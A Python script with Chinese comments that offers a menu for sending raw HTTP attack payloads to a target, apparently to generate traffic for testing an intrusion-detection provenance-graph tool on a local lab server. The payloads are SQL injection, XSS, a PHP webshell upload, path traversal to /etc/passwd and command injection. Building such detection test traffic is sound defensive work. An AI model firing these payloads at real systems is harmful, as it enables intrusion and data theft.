# -*- coding: utf-8 -*-
"""
🎯 攻击测试菜单 - 可选择各种攻击类型
支持单个攻击、批量攻击、自定义攻击
"""
import socket
import time
import sys

# ================= 配置区域 =================
# 支持命令行指定目标 IP，默认使用 127.0.0.1 本地测试
TARGET_IP = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"  # 默认本地
TARGET_PORT = 7888
TIMEOUT = 10  # 增加超时时间
SEND_DELAY = 1.0  # 发送后等待时间，确保数据到达
# =============================================

# 攻击类型配置
ATTACKS = {
    "1": {
        "name": "SQL注入攻击",
        "payload": "GET /admin.php?id=1' union select 1,user(),database()-- HTTP/1.1\r\nHost: {ip}:{port}\r\nConnection: close\r\n\r\n",
        "desc": "触发: nginx → php-fpm → mysql → users.ibd"
    },
    "2": {
        "name": "XSS跨站脚本攻击",
        "payload": "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1\r\nHost: {ip}:{port}\r\nConnection: close\r\n\r\n",
        "desc": "触发: nginx → php-fpm → node → malicious.js"
    },
    "3": {
        "name": "Webshell上传攻击",
        "payload": "POST /upload.php HTTP/1.1\r\nHost: {ip}:{port}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 50\r\nConnection: close\r\n\r\ncode=<?php system($_GET['cmd']); ?>&file=shell.php",
        "desc": "触发: nginx → php-fpm → pam_auth → cp → shell.php"
    },
    "4": {
        "name": "目录遍历攻击",
        "payload": "GET /download?file=../../../etc/passwd HTTP/1.1\r\nHost: {ip}:{port}\r\nConnection: close\r\n\r\n",
        "desc": "触发: nginx → php-fpm → cat → passwd"
    },
    "5": {
        "name": "远程命令执行",
        "payload": "GET /admin.php?cmd=whoami;id;uname HTTP/1.1\r\nHost: {ip}:{port}\r\nConnection: close\r\n\r\n",
        "desc": "触发: nginx → php-fpm → bash → whoami → rce_output.txt"
    },
    "6": {
        "name": "系统侦查",
        "payload": "GET /info.php?cmd=id HTTP/1.1\r\nHost: {ip}:{port}\r\nConnection: close\r\n\r\n",
        "desc": "触发: nginx → php-fpm → bash → id → /proc/self/status"
    }
}

def print_banner():
    """打印横幅"""
    print("\n" + "="*70)
    print("🎯 攻击测试菜单 - 威胁溯源图测试工具")
    print("="*70)
    print(f"📡 目标服务器: {TARGET_IP}:{TARGET_PORT}")
    print("="*70)

def print_menu():
    """打印菜单"""
    print("\n📋 可用攻击类型:")
    print("-"*70)
    for key, attack in ATTACKS.items():
        print(f"  [{key}] {attack['name']:<25} - {attack['desc']}")
    print("-"*70)
    print("  [A] 自动连续攻击（所有类型，间隔3秒）")
    print("  [B] 批量攻击（所有类型，无间隔）")
    print("  [C] 自定义批量攻击（选择多个）")
    print("  [Q] 退出")
    print("="*70)

def send_attack(attack_key, show_details=True):
    """发送单个攻击"""
    if attack_key not in ATTACKS:
        print(f"❌ 无效的攻击编号: {attack_key}")
        return False
    
    attack = ATTACKS[attack_key]
    
    if show_details:
        print(f"\n{'='*70}")
        print(f"🚀 发起攻击: {attack['name']}")
        print(f"📝 进程链: {attack['desc']}")
        print(f"{'='*70}")
    
    try:
        # 创建 socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(TIMEOUT)
        
        # 连接
        sock.connect((TARGET_IP, TARGET_PORT))
        if show_details:
            print(f"📡 已连接到 {TARGET_IP}:{TARGET_PORT}")
        
        # 准备载荷
        payload = attack['payload'].format(ip=TARGET_IP, port=TARGET_PORT)
        payload_bytes = payload.encode('utf-8')
        if show_details:
            print(f"📤 发送载荷: {len(payload_bytes)} 字节")
        
        # 🔥 发送数据（简化版，与测试脚本一致）
        bytes_sent = sock.send(payload_bytes)
        if show_details:
            print(f"   ✅ 已发送: {bytes_sent} 字节")
        
        # 等待服务器处理
        time.sleep(2)
        
        # 接收响应
        try:
            response = sock.recv(4096)
            if show_details:
                print(f"✅ 攻击成功！响应: {len(response)} 字节")
                if b"Hacked" in response:
                    print(f"   💀 服务器响应: Hacked!")
        except socket.timeout:
            if show_details:
                print(f"✅ 攻击已发送（接收超时）")
        except Exception as e:
            if show_details:
                print(f"✅ 攻击已发送（{type(e).__name__}）")
        
        # 关闭连接
        sock.close()
        return True
        
    except ConnectionRefusedError:
        print(f"❌ 连接被拒绝！请确保靶机服务器运行在 {TARGET_IP}:{TARGET_PORT}")
        return False
    except socket.timeout:
        print(f"❌ 连接超时！")
        return False
    except Exception as e:
        print(f"❌ 攻击失败: {e}")
        import traceback
        traceback.print_exc()
        return False

def auto_attack():
    """自动连续攻击（所有类型，间隔3秒）"""
    print("\n🔥 开始自动连续攻击...")
    print("💡 每次攻击间隔3秒，让NIDS/PIDS有时间检测和推送数据\n")
    
    success_count = 0
    for key in sorted(ATTACKS.keys()):
        if send_attack(key, show_details=True):
            success_count += 1
            print(f"⏳ 等待3秒让NIDS/PIDS检测...")
            time.sleep(3)
        else:
            print(f"⚠️ 攻击失败，跳过等待")
    
    print(f"\n✅ 自动攻击完成！成功: {success_count}/{len(ATTACKS)}")
    print("📊 请刷新浏览器查看溯源图")

def batch_attack():
    """批量攻击（所有类型，无间隔）"""
    print("\n🔥 开始批量攻击...")
    print("⚡ 快速发送所有攻击，无间隔\n")
    
    success_count = 0
    for key in sorted(ATTACKS.keys()):
        attack = ATTACKS[key]
        print(f"🚀 [{key}] {attack['name']}...", end=" ")
        if send_attack(key, show_details=False):
            print("✅")
            success_count += 1
        else:
            print("❌")
    
    print(f"\n✅ 批量攻击完成！成功: {success_count}/{len(ATTACKS)}")
    print("⏳ 等待5秒让NIDS/PIDS检测...")
    time.sleep(5)
    print("📊 请刷新浏览器查看溯源图")

def custom_batch_attack():
    """自定义批量攻击"""
    print("\n📝 请输入要执行的攻击编号（用逗号或空格分隔）")
    print("   例如: 1,3,5 或 1 3 5")
    
    user_input = input("👉 攻击编号: ").strip()
    
    # 解析输入
    import re
    attack_keys = re.split(r'[,\s]+', user_input)
    attack_keys = [k.strip() for k in attack_keys if k.strip() in ATTACKS]
    
    if not attack_keys:
        print("❌ 没有有效的攻击编号")
        return
    
    print(f"\n🔥 将执行 {len(attack_keys)} 个攻击:")
    for key in attack_keys:
        print(f"  [{key}] {ATTACKS[key]['name']}")
    
    confirm = input("\n确认执行？(y/n): ").strip().lower()
    if confirm != 'y':
        print("❌ 已取消")
        return
    
    print("\n⚡ 开始执行...\n")
    success_count = 0
    for key in attack_keys:
        attack = ATTACKS[key]
        print(f"🚀 [{key}] {attack['name']}...", end=" ")
        if send_attack(key, show_details=False):
            print("✅")
            success_count += 1
            time.sleep(1)
        else:
            print("❌")
    
    print(f"\n✅ 自定义攻击完成！成功: {success_count}/{len(attack_keys)}")
    print("📊 请刷新浏览器查看溯源图")

def main():
    """主函数"""
    print_banner()
    
    while True:
        print_menu()
        choice = input("\n👉 请选择: ").strip().upper()
        
        if choice == 'Q':
            print("\n👋 退出程序")
            break
        elif choice == 'A':
            auto_attack()
        elif choice == 'B':
            batch_attack()
        elif choice == 'C':
            custom_batch_attack()
        elif choice in ATTACKS:
            send_attack(choice)
            print("\n💡 提示: 等待3秒让NIDS/PIDS检测...")
            time.sleep(3)
            print("📊 请刷新浏览器查看溯源图")
        else:
            print("❌ 无效选择，请重新输入")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n👋 用户中断，退出程序")
        sys.exit(0)
